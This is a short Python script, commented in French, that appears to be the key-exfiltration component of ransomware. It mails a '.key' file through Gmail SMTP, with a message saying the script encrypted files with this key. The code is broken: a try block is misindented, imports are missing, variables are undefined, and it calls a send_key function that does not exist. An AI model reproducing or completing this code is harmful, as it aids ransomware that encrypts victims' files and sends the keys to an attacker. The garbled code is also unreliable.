#!/usr/bin/python
#coding:utf-8

import smtplib
from email.mime.text import MIMEText
import os, sys, base64, smtplib


# Création du mail :

def prompt(prompt):
    return input(prompt).strip()

fromaddr = prompt("From: ")
toaddrs  = prompt("To: ").split()
print("Enter message, end with ^D (Unix) or ^Z (Windows):")

    try:
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "The second key generate by the reboot of system"
        body = "The server you sending a key from the client, the script encrypted her files with this key."
        msg.attach(MIMEText(body, 'plain'))
        filename = "{}.key".format(usrkey)
        attachment = open(filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, "YOUR_PASS_HERE")
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    except IOError:
        pass
    except smtplib.SMTPAuthenticationError:
        print("[!] Login or pass failed")
        pass

# La Fonction pour envoyer le mail :
send_key()
